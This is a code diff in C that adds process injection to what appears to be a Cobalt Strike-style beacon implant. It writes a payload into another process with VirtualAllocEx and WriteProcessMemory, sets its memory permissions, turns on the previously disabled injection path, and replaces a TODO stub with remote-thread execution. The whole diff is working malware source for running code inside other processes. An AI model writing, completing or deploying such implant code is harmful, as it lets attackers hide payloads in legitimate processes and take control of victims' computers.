@@ -216,6 +216,52 @@ char* InjectViaNtMapViewOfSection(HANDLE handle, DWORD pid, const char* payload,
 	return (char*)lpBaseAddress;
 }
 
+char* InjectViaVirtualAllocEx(HANDLE hProcess, DWORD pid, const char* payload, int size)
+{
+	/* determine the minimum allocation size based on S_PROCINJ_MINALLOC */
+	int dwSize = max(S_PROCINJ_MINALLOC, size);
+
+	/* allocate memory in the target process */
+	LPBYTE lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);
+
+	/* check if the memory was allocated */
+	if (lpBaseAddress == NULL)
+	{
+		const DWORD lastError = GetLastError();
+		LERROR("Could not allocate %d bytes in process: %s", dwSize, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError);
+		return NULL;
+	}
+
+	int wrote = 0;
+	for(int total = 0; total < size; total += wrote)
+	{
+		if (!WriteProcessMemory(hProcess, lpBaseAddress + total, payload + total, size - total, &wrote))
+		{
+			DWORD lastError = GetLastError();
+			LERROR("Could not write to process memory: %s", LAST_ERROR_STR(lastError));
+			BeaconErrorD(ERROR_WRITE_TO_PROC_MEMORY_FAILED, lastError);
+			VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
+			return NULL;
+		}
+	}
+
+	if (S_PROCINJ_PERMS_I != S_PROCINJ_PERMS)
+	{
+		DWORD flOldProtect;
+		if (!VirtualProtectEx(hProcess, lpBaseAddress, dwSize, S_PROCINJ_PERMS, &flOldProtect))
+		{
+			DWORD lastError = GetLastError();
+			LERROR("Could not adjust permissions in process: %s", LAST_ERROR_STR(lastError));
+			BeaconErrorD(ERROR_ADJUST_PERMISSIONS_FAILED, lastError);
+			VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
+			return NULL;
+		}
+	}
+
+	return (char*)lpBaseAddress;
+}
+
 char* InjectRemotely(INJECTION* injection, const char* payload, int size)
 {
 	if (S_PROCINJ_ALLOCATOR && injection->isSameArchAsHostSystem)
@@ -224,9 +270,8 @@ char* InjectRemotely(INJECTION* injection, const char* payload, int size)
 	}
 	else
 	{
-		//return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
+		return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
 	}
-	return NULL;
 }
 
 BOOL AdjustMemoryPermissions(char* payload, int size) {
@@ -638,8 +683,12 @@ void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset
 	if (!target)
 		return;
 
-	LTODO("Implement ExecuteInjection");
-	return;
+	if(!ExecuteInjection(injection, target, pOffset, parameter))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not create remote thread in %d: %s", injection->pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_CREATE_REMOTE_THREAD_FAILED, injection->pid, lastError);
+	}
 }
 
 #define REFLECTIVE_LOADER_SIZE 51200
